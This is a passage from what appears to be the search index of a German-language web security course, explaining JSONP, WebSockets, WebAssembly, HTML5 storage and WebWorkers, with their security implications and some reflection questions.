h\u00e4ufig JSONP zum Datenaustausch mittels Javascript bzw. zum Umgehen der SOP verwendet. Bei diesem Verfahren werden die gew\u00fcnschten Daten \u00fcber einen GET-Request als Javascript-Datei geladen. Damit die geladenen Daten an Javascript \u00fcbergeben werden, wird beim Inkludieren der Daten eine Callback Funktion mit \u00fcbergeben.</p> <p>Ein Beispiel, mittels der URL <code>/php/jsonp.php?callback=callback</code> wird eine Operation aufgerufen, der Parameter callback gibt an, wie die lokale Javascript-Callback Funktion hei\u00dft. Das Antwortdokument ist z.B.:</p> <pre><code>callback('{ \"name\":\"John\", \"age\":30, \"city\":\"New York\" }');\n</code></pre> <p>In der aufrufenden Webseite w\u00fcrde der Call nun folgenderma\u00dfen aussehen:</p> <pre><code>&lt;script&gt;\nfunction callback(data) {\n    console.log(data);\n}\n&lt;/script&gt;\n&lt;script src=\"/jsonp.php?callback=callback&gt;&lt;/script&gt;\n</code></pre> <p>Es wird also vom Server ein Funktionsaufruf (auf die Callback-Funktion) mit den serverseitigen-Daten erzeugt und dadurch im Webbrowser die jeweilige Javascript-Funktion aufgerufen. In diesem Fall greift die SOP nicht (da der src-Aufruf ein GET-Request ist), allerdings muss bei der Eingabepr\u00fcfung innerhalb der callback-Funktion darauf geachtet werden, ob Schadcode enthalten ist. Aus diesem Grund wird empfohlen, immer CORS anstatt von JSONP einzusetzen (abgesehen davon, dass eine JSONP-Operation meistens f\u00fcr alle Teilnehmer des Internets verf\u00fcgbar ist).</p>"},{"location":"web-applications/web_technologies/#websockets","title":"WebSockets","text":"<p>WebSockets bieten eine bidirektionale Verbindung zwischen Webbrowser und Webserver. Im Gegensatz zu klassischen HTTP (1.0/1.1) kann der Server auch Nachrichten zum Client pushen, ebenso ist der Overhead geringer, da keine dezidierten HTTP-Header pro \u00fcbertragener Nachricht anfallen.</p> <p>Der WebSocket wird durch einen Client-Request aufgebaut. Bei diesem teilt der Client mit, dass er gerne die Verbindung auf einen WebSocket upgraden will, im Erfolgsfall entgegnet der Server mit einem HTTP 101 Code. Bei der initialen Client-Anfrage werden alle HTTP Header mit \u00fcbertragen, der Server erlangt so Zugriff auf etwaige Authorization-Header und/oder Session-Cookies und kann so Clients identifizieren.</p>"},{"location":"web-applications/web_technologies/#webassembly","title":"WebAssembly","text":"<p>WebAssembly erlaubt es, hoch-performante Programme zu schreiben, welche innerhalb eines Webbrowsers ausgef\u00fchrt werden. Einzelne Funktionen, die in WebAssembly geschrieben werden, k\u00f6nnen \u00fcber JavaScript aufgerufen werden.</p> <p>Hier w\u00e4ren zwei Angriffsm\u00f6glichkeiten offensichtlich:</p> <ul> <li> <p>Verwendung von WebAssembly um einen hoch-performanten Crypto-Miner   im Browser auszuf\u00fchren.</p> </li> <li> <p>Verwendung von WebAssembly zum Auslagern von Teilen von   JavaScript-Schadcode um auf diese Weise die Detektion durch   Anti-Malware Tools zu umgehen.</p> </li> </ul> <p>Aktuell (Stand Anfang 2020) waren keine gro\u00dffl\u00e4chigen Angriffe mittels WebAssembly bekannt.</p>"},{"location":"web-applications/web_technologies/#html5-progressive-web-appplications","title":"HTML5 / Progressive Web Appplications","text":"<p>Im Laufe der Zeit wurden die M\u00f6glichkeiten der Webbrowser zur Interaktion mit Benutzern bzw. ihrer Umgebung immer st\u00e4rker erweitert. Diese neuen M\u00f6glichkeiten k\u00f6nnen zumeist \u00fcber JavaScript innerhalb des Browsers angesprochen werden. Indirekt werden sie allerdings weiterhin \u00fcber die Webserver kontrolliert, da diese den JavaScript Code ja zuerst auf den jeweiligen Webseiten platzieren m\u00fcssen.</p>"},{"location":"web-applications/web_technologies/#html5-webstoragelocalstorage","title":"HTML5 WebStorage/LocalStorage","text":"<p>HTML5 LocalStorage oder WebStorage bietet Webapplikationen die M\u00f6glichkeit lokal gr\u00f6\u00dfere Datenmengen (um die f\u00fcnf Megabyte) zu speichern. Im Gegensatz dazu sollte bei Cookies davon ausgegangen werden, dass maximal 4096 Byte gespeichert werden k\u00f6nnen.</p> <p>\u00c4hnlich wie bei Cookies kann ein Angreifer mit einer Javascript-L\u00fccke die lokalen Daten modifizieren. Eine Webapplikation muss daher auf jeden Fall die Integrit\u00e4t der gespeicherten Daten vor jedem Zugriff \u00fcberpr\u00fcfen. Da LocalStorage im Klartext abgelegt wird, muss bei sensiblen Daten die Webapplikation selbst f\u00fcr die Vertraulichkeit der Daten durch Verschl\u00fcsselung sorgen.</p> <p>Der Entwickler kann zwischen SessionStorage und LocalStorage unterscheiden. Ersteres wird beim Schlie\u00dfen des Browser-Fensters verworfen, letzteres wird wirklich langfristig persistiert. Wenn m\u00f6glich sollte SessionStorage verwendet werden.</p> <p>Verglichen zu Cookie ist WebStorage und SessionStorage st\u00e4rker gegen\u00fcber XSS-Angriffen verwundbar. Dies ist durch zwei Probleme bedingt:</p> <ol> <li> <p>Cookies k\u00f6nnen durch Verwendung des httpOnly-Flags den Zugriff    durch JavaScript unterbinden. Bei WebStorage wurde dieser    Sicherheitsmechanismus nicht vorgesehen.</p> </li> <li> <p>Cookies k\u00f6nnen auf einen Unterpfad gescoped werden. Werden z.B. zwei    Webapplikationen auf einem gemeinsamen Server Betrieben, kann ein    Cookie z.B. f\u00fcr <code>https://example.local/app1</code> und ein Cookie f\u00fcr    <code>https://example.local/app2</code> ausgestellt werden. Eine    Applikation besitzt keinen Zugriff auf das Cookie der anderen    Applikation. Bei WebStorage kann dies nicht durchgef\u00fchrt werden,    WebStorage ist immer f\u00fcr die Domain g\u00fcltig. Das hei\u00dft, dass ein    Angreifer mit einem XSS-Fehler in app1 auf den WebStorage der app2    zugreifen kann.</p> </li> </ol> <p>Aus diesen Gr\u00fcnden verbieten einige Sicherheitsrichtlinien den Einsatz von HTML5 Web- und SessionStorage.</p>"},{"location":"web-applications/web_technologies/#html5-webworkers","title":"HTML5 WebWorkers","text":"<p>Die Javascript-Umgebung eines Webbrowers ist eine Single-Thread Umgebung. Wenn ein Javascript l\u00e4nger l\u00e4uft, blockiert es die Ausf\u00fchrung aller anderen JavaScripts auf der Seite.</p> <p>Um long-running JavaScripts zu erlauben, wurden WebWorker eingef\u00fchrt. Dies sind JavaScript Programme die analog zu einem Background-Thread gestartet werden und an welche Nachrichten von der Webseite aus verschickt werden k\u00f6nnen.</p> <p>Da WebWorker selbst AJAX-Requests (XMLHttpRequest) ausf\u00fchren, und potentiell die CPU des Hosts auslasten k\u00f6nnen, muss bei deren Entwicklung darauf geachtet werden, dass ein Angreifer nicht Zugriff auf diese erh\u00e4lt. Insbesondere sollten keine benutzer-bereitgestellten Daten direkt an Webworker \u00fcbergeben werden.</p>"},{"location":"web-applications/web_technologies/#interaktionsmoglichkeiten","title":"Interaktionsm\u00f6glichkeiten","text":"<p>Webbrowser ersetzen aktuell Desktop-Applikationen, ben\u00f6tigen hierf\u00fcr allerdings erweiterte Interaktionsm\u00f6glichkeiten. Diese werden durch neue Standards geschaffen, zum Beispiel:</p> <ul> <li> <p>WebRTC erlaubt die peer-to-peer Kommunikation zwischen Browsern und   wird z.B. f\u00fcr Audio- oder Videokonferenzen verwendet.</p> </li> <li> <p>WebNFC erlaubt die Verwendung von NFC \u00fcber Webbrowser.</p> </li> <li> <p>WebBluetooth erlaubt es, JavaScript auf konfigurierte BlueTooth LE   devices zuzugreifen und wird f\u00fcr SmartHealth bzw. SmartHome   Anwendungen ben\u00f6tigt.</p> </li> </ul> <p>Bei diesen Schnittstellen sind aktuell weniger Sicherheits-, sondern eher Privatsph\u00e4re-Gef\u00e4hrdungen bekannt. Generell kann hier das Gef\u00e4hrdungspotential mit jenem von Mobilapplikationen auf Smartphones verglichen werden.</p>"},{"location":"web-applications/web_technologies/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Wie k\u00f6nnen HTTP Header im Zuge einer Information Disclosure    verwendet werden?</p> </li> <li> <p>Was versteht man unter SOP? Warum und wie kann dieses Prinzip mit    CORS aufweichen?</p> </li> <li> <p>Was sind HTTP Methoden? Erkl\u00e4re safe und idempotente HTTP    Methoden.</p> </li> <li> <p>Welche Vor- und Nachteile besitzt die Verwendung von Perfect Forward    Secrecy?</p> </li> <li> <p>Welche Flags sollten bei Verwendung von HTTP Cookie-basierter    Sessions gesetzt werden?</p> </li> <li> <p>HTTP Cookies als auch HTTP5 localStorage/sessionStorage k\u00f6nnen zur    Speicherung von lokalen Daten verwendet werden. Erl\u00e4utere die    Unterschiede.</p> </li> </ol> <p>[1] Da das P in HTTP bereits f\u00fcr Protocol steht, macht die Bezeichnung ,,HTTP Protokoll\u201d wenig Sinn.</p> <p>[2] Create, Update, Read and Delete of Resources.</p> <p>[3] \u00e4ltere und unsichere Versionen hie\u00dfen SSL.</p> <p>[4] z.B. 31536000 entspricht einem Jahr</p> <p>[5] Genauere Informationen k\u00f6nnen unter https://hstspreload.org/ gefunden werden.</p> <p>[6] siehe auch Seite</p> <p>[7] voraussichtliches Ver\u00f6ffentlichungsdatum: Februar 2020.</p> <p>[8] Im Sinne von: alle Webseiten wurden von Servern zugestellt, die Webbrowser zeigten diesen Content nur statisch an.</p> <p>[9] eigentlich reverse-engineerte\u2026</p> <p>[10] https://javascript.info/</p> <p>[11] https://github.com/getify/You-Dont-Know-JS</p> <p>[12] Achtung: der Internet Explorer Browser ignoriert den Port bei der Bestimmung des Origins!</p>"}]}